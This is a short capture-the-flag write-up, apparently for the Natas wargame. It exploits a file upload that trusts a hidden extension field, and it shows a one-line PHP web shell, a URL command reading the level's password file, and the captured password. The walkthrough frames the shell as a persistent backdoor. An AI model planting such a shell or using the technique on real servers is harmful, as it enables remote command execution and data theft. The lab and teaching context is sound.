#### Concept
**Arbitrary File Upload via Client-Side Extension Manipulation.**
This vulnerability occurs when a web server allows users to upload files without validating their content type on the server side, while relying on a client-supplied hidden parameter to determine the final file extension.
#### Key Commands
- **`shell_exec()`**: A PHP function used to execute arbitrary commands via the host shell and return the complete output as a string.
- **`DevTools`**: Used to modify hidden HTML form inputs before submission.
#### Walkthrough / Resolution
- **Analyze the Form**: The application features a file upload mechanism. By inspecting the DOM using DevTools, a hidden input field named `filename` was discovered with a default value ending in `.jpg`.
- **Craft the Dynamic Payload**: Created a local file containing a flexible web shell:
```php
	<?php echo shell_exec($_GET['cmd']); ?>
```
 >	Analysis of the script: `$_GET['cmd']` intercepts any input passed via the URL query string parameter `?cmd=`. This input is fed directly into `shell_exec()`, which runs it on the server operating system.
- **Bypass Restrictions**: Modified the hidden `<input type="hidden" name="filename" value="...">` field in the browser, changing the extension from `.jpg` to `.php`.
- **Execution**: Uploaded the file. Because the server trusts the hidden field to append the extension, it saved it as an executable `.php` file.
- **Command Execution**: Navigated to the generated upload link. To extract the password, the request was appended with the specific payload in the URL: `?cmd=cat /etc/natas_webpass/natas13`.
#### Key Takeaways / Lessons Learned
- **The Power of Dynamic Web Shells**: Using `_GET['cmd']` transforms a static exploit into a reusable administration tool. Instead of uploading a new file for every action, this pattern keeps the backend backdoor open for any future shell commands (`ls`, `whoami`, etc.).
- **Never trust hidden inputs**: Attackers can easily modify any client-side data (hidden fields, cookies, select options) before it hits the server.
#### Pass 13
trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC
